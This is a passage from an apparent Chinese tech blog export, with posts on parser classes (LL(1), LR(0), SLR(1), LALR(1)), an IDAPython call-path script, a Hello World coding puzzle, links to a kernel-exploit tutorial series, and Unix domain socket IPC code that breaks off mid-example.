<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">形如 A-&gt;a|β 这样的文法，满 足</span><br><span class="line">        ①FIRST(α)∩ FIRST (β ) &#x3D;Φ</span><br><span class="line">        ②若ε∈ FIRST( α)， 要满足 FIRST(β) ∩FOLLOW(A)&#x3D;Φ</span><br></pre></td></tr></table></figure>

<h5 id="2-LR-0"><a href="#2-LR-0" class="headerlink" title="2. LR(0)"></a>2. LR(0)</h5><p>如果某一文法能够构造一张分析表，使得表中每一个元素至多只有一种明确动作，则该文法称为LR文法。</p>
<p>具体来说：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、构造它的LR(0)项目集合的DFA（即识别该文法全部活前缀的DFA）；</span><br><span class="line">2、根据该DFA画出该文法的LR(0)分析表；</span><br><span class="line">3、在分析表中，每格要么只有一个内容，要么没有内容，（即无冲突）则为LR(0)文法。</span><br></pre></td></tr></table></figure>

<p>概括一下就是：见到First集就移进，见到终态就归约</p>
<h5 id="3-SLR-1"><a href="#3-SLR-1" class="headerlink" title="3. SLR(1)"></a>3. SLR(1)</h5><p>满足下面两个条件的文法是SLR(1)文法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a.对于在s中的任何项目 A→α.Xβ,当X是一个终结符，且X在Follow(B)中时，s中没有完整的项目B→r.</span><br><span class="line"></span><br><span class="line">b.对于在s中的任何两个完整项目A→α.和 B→β.,Follow(A)∩Follow(B)为空。</span><br></pre></td></tr></table></figure>

<p>概括就是：见到First集就移进，见到终态先看Follow集，与Follow集对应的项目归约，其它报错。</p>
<h5 id="4-LALR-1"><a href="#4-LALR-1" class="headerlink" title="4. LALR(1)"></a>4. LALR(1)</h5><p>LALR即“Look-Ahead LR”。其中，Look-Ahead为“向前看”，L代表对输入进行从左到右的检查，R代表反向构造出最右推导序列。</p>
<h5 id="5-LR-1"><a href="#5-LR-1" class="headerlink" title="5. LR(1)"></a>5. LR(1)</h5><p>和LR(0)一致，只是构造自动机的时候多向前查看一个字符。</p>
<h4 id="0x02-关系与对比"><a href="#0x02-关系与对比" class="headerlink" title="0x02: 关系与对比"></a>0x02: 关系与对比</h4><h5 id="1-SLR-1-与LR-0-的关系："><a href="#1-SLR-1-与LR-0-的关系：" class="headerlink" title="1. SLR(1)与LR(0)的关系："></a>1. SLR(1)与LR(0)的关系：</h5><p>SLR(1)与LR(0)：简单的LR语法分析技术（即SLR（1）分析技术）的中心思想是根据文法构造出LR（0）自动机。</p>
<ul>
<li><p>   LR(0):见到First集就移进，见到终态就归约</p>
</li>
<li><p>   SLR(1)见到First集就移进，见到终态先看Follow集，与Follow集对应的项目归约，其它报错。</p>
</li>
</ul>
<h5 id="2-LR-1-与LR-0-的关系："><a href="#2-LR-1-与LR-0-的关系：" class="headerlink" title="2.  LR(1)与LR(0)的关系："></a>2.  LR(1)与LR(0)的关系：</h5><p>规范LR（1）语法分析技术的中心思想是根据文法构造出LR（1）自动机 ，而规范LR（1）自动机构造方法和LR（0）自动机的构造方法相同，只是多增加了向前搜索符号。</p>
<h5 id="3-规范LR-1-与LALR-1-的关系："><a href="#3-规范LR-1-与LALR-1-的关系：" class="headerlink" title="3. 规范LR(1)与LALR(1)的关系："></a>3. 规范LR(1)与LALR(1)的关系：</h5><p>LALR(1)是对LR(1)项集族I中具有同心项的项集进行合并得到I’，然后根据I’进行分析的方法。</p>
<h5 id="4-各种文法能力的对比"><a href="#4-各种文法能力的对比" class="headerlink" title="4. 各种文法能力的对比"></a>4. 各种文法能力的对比</h5><p><img src="http://blogimg-10065924.cossh.myqcloud.com/compilers/111.png" alt="cmp"></p>
<h4 id="0x03-引用"><a href="#0x03-引用" class="headerlink" title="0x03: 引用"></a>0x03: 引用</h4><p><a href="https://www.cnblogs.com/yongzhewudi/p/6048301.html">LL LR SLR LALR 傻傻分不清</a></p>
<p><a href="http://blog.csdn.net/linraise/article/details/9237195">编译原理:LL(1),LR(0),SLR(1),LALR(1),LR(1)对比</a></p>
<p><a href="http://blog.csdn.net/carino_ly/article/details/24097889">如何判断文法是LL(1)SLR(1)LR(1)LALR(1)的？</a></p>
<p><a href="https://zh.wikipedia.org/wiki/LALR%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90%E5%99%A8">维基百科</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>编译原理</tag>
        <tag>Study</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA自动化分析</title>
    <url>/2019/07/09/IDA%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00-需求"><a href="#0x00-需求" class="headerlink" title="0x00 : 需求"></a>0x00 : 需求</h2><p>​    最近有一些自动化分析bin中调用路径的需求，在查询了一些资料后，组合了一些现有方案，最终完成了自己的这个小工具。</p>
<p>​    具体需求：</p>
<pre><code>-    自动分析，后台跑
-    分析给定的函数调用路径</code></pre>
<a id="more"></a>

<h2 id="0x01-code"><a href="#0x01-code" class="headerlink" title="0x01 : code"></a>0x01 : code</h2><h3 id="python模版"><a href="#python模版" class="headerlink" title="python模版"></a>python模版</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">idc.Wait() <span class="comment"># 等待分析完</span></span><br><span class="line"></span><br><span class="line">.... <span class="comment"># 分析工作</span></span><br><span class="line"></span><br><span class="line">idc.Exit(<span class="number">0</span>) <span class="comment"># 完成后自动退出</span></span><br></pre></td></tr></table></figure>



<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;/Applications/IDA Pro 7.0/ida64.app/Contents/MacOS/ida64&quot;</span> -c -A -S<span class="string">&quot;scan.py&quot;</span> bin</span><br></pre></td></tr></table></figure>



<h3 id="分析调用路径"><a href="#分析调用路径" class="headerlink" title="分析调用路径"></a>分析调用路径</h3><p>这部分直接用了<a href="https://cloud.tencent.com/info/b21c092ae90226892ae925649189667a.html">利用IDA Python静态分析函数调用路径</a>里的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_r_call_chain</span>(<span class="params">func_name, osintneting</span>):</span></span><br><span class="line">    <span class="keyword">del</span> r_call_chain[:]</span><br><span class="line">    f_r_call_out = <span class="built_in">open</span>(<span class="string">&#x27;call_&#123;0&#125;_&#123;1&#125;.csv&#x27;</span>.<span class="built_in">format</span>(cur_bin_filename, func_name), <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    get_my_caller(func_name, osintneting, f_r_call_out)</span><br><span class="line">    f_r_call_out.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_my_caller</span>(<span class="params">func_name, osintneting, fl</span>):</span></span><br><span class="line">    <span class="keyword">if</span> ida_kernwin.user_cancelled():</span><br><span class="line">        print(<span class="string">&#x27;Cancelled&#x27;</span>)</span><br><span class="line">        fl.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#123;0&#125;\t&#x27;</span>.<span class="built_in">format</span>(func_name)</span><br><span class="line">    r_call_chain.append(<span class="built_in">str</span>)</span><br><span class="line">    addr = get_name_ea(<span class="number">0</span>, func_name)</span><br><span class="line">    addr_ref_to = get_first_fcref_to(addr)</span><br><span class="line"></span><br><span class="line">    osinteneting_end = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> addr_ref_to == BADADDR:</span><br><span class="line">        osinteneting_end = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> osintneting == -<span class="number">1</span>:</span><br><span class="line">        osinteneting_end = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> osintneting == <span class="number">1</span>:</span><br><span class="line">        osinteneting_end = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> osinteneting_end <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        length = <span class="built_in">len</span>(r_call_chain)</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            fl.write(r_call_chain[length - idx - <span class="number">1</span>])</span><br><span class="line">            sys.stdout.write(r_call_chain[length - idx - <span class="number">1</span>])</span><br><span class="line">        fl.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        sys.stdout.write(<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">        r_call_chain.pop()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr_ref_to != BADADDR) <span class="keyword">and</span> (addr_ref_to != addr):</span><br><span class="line">        parent_func_name = get_func_name(addr_ref_to)</span><br><span class="line">        get_my_caller(parent_func_name, osintneting - <span class="number">1</span>, fl)</span><br><span class="line">        addr_ref_to = get_next_fcref_to(addr, addr_ref_to)</span><br><span class="line">        <span class="keyword">if</span> addr_ref_to == BADADDR:</span><br><span class="line">            r_call_chain.pop()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<p>##0x03 : reference</p>
<p><a href="http://answerrrrrrrrr.github.io/2016/09/20/idapython-commandline/">命令行调用 idapython 脚本</a></p>
<p><a href="https://cloud.tencent.com/info/b21c092ae90226892ae925649189667a.html">利用IDA Python静态分析函数调用路径</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World升级版</title>
    <url>/2017/10/01/Hello-World%E5%8D%87%E7%BA%A7%E7%89%88/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>偶然在知乎上看到一个问题，特殊的方式输出hello world，后来知道这是cnss的招新题目，感觉还挺有意思的，做了下记录下来。</p>
<a id="more"></a>

<p>题目要求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.不用 “ ”  输出Hello World</span><br><span class="line">2.不用 ;  输出Hello World</span><br><span class="line">3.不用#  输出Hello World</span><br><span class="line">4.不用括号输出Hello World (包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )</span><br></pre></td></tr></table></figure>

<h4 id="0x01-level-1"><a href="#0x01-level-1" class="headerlink" title="0x01: level 1"></a>0x01: level 1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">72</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">101</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">108</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">108</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">111</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">119</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">111</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">114</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">108</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:10:11]</span></span><br><span class="line">$ ./<span class="built_in">test</span></span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure>

<h4 id="0x02-level-2"><a href="#0x02-level-2" class="headerlink" title="0x02: level 2"></a>0x02: level 2</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">119</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">10</span>)) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:15:10]</span></span><br><span class="line">$ clang test.c -o <span class="built_in">test</span></span><br><span class="line">test.c:3:8: warning: implicit declaration of <span class="keyword">function</span> <span class="string">&#x27;putchar&#x27;</span> is invalid <span class="keyword">in</span> C99</span><br><span class="line">      [-Wimplicit-function-declaration]</span><br><span class="line">    <span class="keyword">if</span>(putchar(72)) &#123;&#125;</span><br><span class="line">       ^</span><br><span class="line">1 warning generated.</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:15:15]</span></span><br><span class="line">$ ./<span class="built_in">test</span></span><br><span class="line">Hello wrld</span><br></pre></td></tr></table></figure>

<h4 id="0x03-level-3"><a href="#0x03-level-3" class="headerlink" title="0x03: level 3"></a>0x03: level 3</h4><p>主要是#符号的替代。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line">%:include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    if(putchar(72)) &#123;&#125;</span><br><span class="line">    if(putchar(101)) &#123;&#125;</span><br><span class="line">    if(putchar(108)) &#123;&#125;</span><br><span class="line">    if(putchar(108)) &#123;&#125;</span><br><span class="line">    if(putchar(111)) &#123;&#125;</span><br><span class="line">    if(putchar(32)) &#123;&#125;</span><br><span class="line">    if(putchar(119)) &#123;&#125;</span><br><span class="line">    if(putchar(114)) &#123;&#125;</span><br><span class="line">    if(putchar(108)) &#123;&#125;</span><br><span class="line">    if(putchar(100)) &#123;&#125;</span><br><span class="line">    if(putchar(10)) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:18:03]</span></span><br><span class="line">$ clang test.c -o <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in /tmp [18:18:05]</span></span><br><span class="line">$ ./<span class="built_in">test</span></span><br><span class="line">Hello wrld</span><br></pre></td></tr></table></figure>

<h4 id="0x04-level-4"><a href="#0x04-level-4" class="headerlink" title="0x04: level 4"></a>0x04: level 4</h4><p>这个好难想…shellcode行么我想说…<br>msfvenom直接生成一个…<br>那么问题来了，sc也要执行啊，咋规避括号，难道要手写一个PE/ELF文件么。</p>
<h4 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05: 结语"></a>0x05: 结语</h4><p>挺有意思的问题，这个东西仁者见仁，智者见智，知乎上见到太多方式了，毕竟putchar很丑陋，轮子哥那个代码还是挺好看的。至于level 4，有人提到了hack c，很可惜UB…</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel Exploit 4 beginners</title>
    <url>/2017/04/06/Linux-Kernel-Exploit-4-beginners/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>Linux Kernel Exploit 的入门系列，开始像无头苍蝇似的瞎撞，找资料学习，后来joker师傅指了明路，才走上正轨。</p>
<p>遂记录三篇，文章均已发布在安全客，博客就只丢出链接。</p>
<a id="more"></a>



<h4 id="0x01-文章链接"><a href="#0x01-文章链接" class="headerlink" title="0x01: 文章链接"></a>0x01: 文章链接</h4><p><a href="http://bobao.360.cn/learning/detail/3700.html">【系列分享】Linux 内核漏洞利用教程（一）：环境配置</a></p>
<p><a href="http://bobao.360.cn/learning/detail/3702.html">【系列分享】Linux 内核漏洞利用教程（二）：两个Demo</a></p>
<p><a href="http://bobao.360.cn/learning/detail/3706.html">【系列分享】Linux 内核漏洞利用教程（三)： 实战CSAW CTF题目</a></p>
<h4 id="0x02-一点想法"><a href="#0x02-一点想法" class="headerlink" title="0x02 : 一点想法"></a>0x02 : 一点想法</h4><p>还是师傅的话说得好：分享精神，让更多的人可以一起学习。</p>
<p>QAQ</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>linux kernel</tag>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux socket进程间通信及应用</title>
    <url>/2017/01/30/Linux%20socket%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p><code>linux socket</code>网络编程大家肯定不会陌生，然而<code>linux</code>也可以使用socket这套接口来实现进程间通信，大概的步骤和网络通信差不多，也是可以基于C/S的，服务端创建套接字，然后绑定、侦听，客户端创建套接字，链接，然后就可以通信了。这篇文章主要是关于基本使用以及一点应用，仅仅是个人看法。</p>
<a id="more"></a>

<h4 id="0x01-基础部分"><a href="#0x01-基础部分" class="headerlink" title="0x01 基础部分"></a>0x01 基础部分</h4><h6 id="1-socket创建"><a href="#1-socket创建" class="headerlink" title="1.socket创建"></a>1.socket创建</h6><p>首先来看socket的创建，依然是使用<code>socket()</code>函数，不过第一个参数，即类型变了，具体函数如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">    unix_socket = socket(AF_UNIX, type, <span class="number">0</span>);</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
<p><code>AF_UNIX</code>也可以替换成<code>AF_LOCAL</code></p>
<h6 id="2-socket命名"><a href="#2-socket命名" class="headerlink" title="2.socket命名"></a>2.socket命名</h6><p>关于socket进程通信，命名方式有两种，一是普通命名，二是抽象命名空间。差别在于，普通命名会根据你给的名字产生一个socket文件，然后你的通信过程socket会读取这个文件，这种方式也就决定了你编写的server必须对这个命名文件的路径有读写权限，而且客户端必须知道这个文件的路径；然而抽象命名空间的方式没有这个限制，但是需要一个全局名称，客户端根据这名称来连接。</p>
<p>1.普通命名</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_NAME <span class="meta-string">&quot;/tmp/server_socket&quot;</span></span></span><br><span class="line"></span><br><span class="line">server_addr.sun_family = AF_UNIX;</span><br><span class="line"><span class="built_in">strcpy</span>(server_addr.sun_path,SERVER_NAME);</span><br><span class="line">server_len = <span class="keyword">sizeof</span>(struct sockaddr_un);</span><br><span class="line">client_len = server_len;</span><br></pre></td></tr></table></figure>
<p>服务端必须对<code>/tmp/server_socket</code>有读写权限，且客户端知道这个路径。</p>
<p>2.抽象命名空间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_NAME <span class="meta-string">&quot;@server_socket&quot;</span></span></span><br><span class="line"></span><br><span class="line">server_addr.sun_family = AF_UNIX;  </span><br><span class="line"><span class="built_in">strcpy</span>(server_addr.sun_path, SERVER_NAME);  </span><br><span class="line">server_addr.sun_path[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">server_len = <span class="built_in">strlen</span>(SERVER_NAME)  + offsetof(struct sockaddr_un, sun_path);</span><br></pre></td></tr></table></figure>
<p>这种方式对地址结构成员sun_path数组赋值的时候，必须把第一个字节置0。</p>
<h6 id="2-socket绑定"><a href="#2-socket绑定" class="headerlink" title="2.socket绑定"></a>2.socket绑定</h6><p>这个是对于服务端来说的，也是使用bind函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">bind(server_sockfd, (struct sockaddr *)&amp;server_addr, server_len);  </span><br><span class="line">    ....</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<h6 id="2-socket侦听"><a href="#2-socket侦听" class="headerlink" title="2.socket侦听"></a>2.socket侦听</h6><p>使用listen函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    ....</span><br><span class="line">    ....</span><br><span class="line">listen(server_sockfd, <span class="number">5</span>);</span><br><span class="line">    ....</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<h6 id="2-socket连接"><a href="#2-socket连接" class="headerlink" title="2.socket连接"></a>2.socket连接</h6><p>下面这个部分，作为服务端，要等待服务端的连接，使用accept函数接收连接然后做处理，作为服务端使用connect函数连接，然后通信。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//accept client connect</span></span><br><span class="line">    client_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    client_sockfd = accept(server_sockfd,(struct sockaddr*)&amp;client_addr, &amp;client_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//每次读一个字节并显示</span></span><br><span class="line">    read(client_sockfd, &amp;ch, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read from client %d: %c&quot;</span>,client_sockfd,ch);</span><br><span class="line">    ch ++;</span><br><span class="line">    write(client_sockfd, &amp;ch, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//关闭连接</span></span><br><span class="line">    close(client_sockfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//communicate with server socket  </span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;set send content:&quot;</span>);  </span><br><span class="line">    <span class="comment">//从键盘读取一个自己发送给服务端</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;ch);  </span><br><span class="line">    write(sockfd, &amp;ch, <span class="number">1</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;send to server:%c \n&quot;</span>,ch);  </span><br><span class="line">    read(sockfd, &amp;ch, <span class="number">1</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;read from server: %c\n&quot;</span>, ch);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-示例代码"><a href="#0x02-示例代码" class="headerlink" title="0x02 示例代码"></a>0x02 示例代码</h4><p>这里直接使用了<a href="http://blog.csdn.net/xnwyd/article/details/7359506">参考blog中的代码</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//server.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_NAME <span class="meta-string">&quot;@server_socket&quot;</span></span></span><br><span class="line"><span class="comment">//#define SERVER_NAME &quot;/tmp/server_socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> server_sockfd, client_sockfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> server_len, client_len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">server_addr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> nread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//delete the old server socket</span></span><br><span class="line">    unlink(<span class="string">&quot;server_socket&quot;</span>);</span><br><span class="line">    server_sockfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    server_addr.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strcpy</span>(server_addr.sun_path, SERVER_NAME);</span><br><span class="line">    server_addr.sun_path[<span class="number">0</span>]=<span class="number">0</span>;<span class="comment">//普通命名不应该有这句</span></span><br><span class="line">    server_len = <span class="built_in">strlen</span>(SERVER_NAME)  + offsetof(struct sockaddr_un, sun_path);</span><br><span class="line">    bind(server_sockfd, (struct sockaddr *)&amp;server_addr, server_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//listen the server</span></span><br><span class="line">    listen(server_sockfd, <span class="number">5</span>);</span><br><span class="line">    client_sockfd = <span class="number">-1</span>;</span><br><span class="line">    client_len = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;server waiting...\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(client_sockfd == <span class="number">-1</span>)&#123;</span><br><span class="line">            client_sockfd = accept(server_sockfd,(struct sockaddr*)&amp;client_addr, &amp;client_len);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        nread = read(client_sockfd, &amp;ch, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(nread == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;client %d disconnected\n&quot;</span>,client_sockfd);</span><br><span class="line">            client_sockfd = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;read from client %d: %c\n&quot;</span>,client_sockfd,ch);</span><br><span class="line">            ch ++;</span><br><span class="line">            write(client_sockfd, &amp;ch, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//client.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_NAME <span class="meta-string">&quot;@server_socket&quot;</span></span></span><br><span class="line"><span class="comment">//#define SERVER_NAME &quot;/tmp/server_socket&quot;</span></span><br><span class="line"></span><br><span 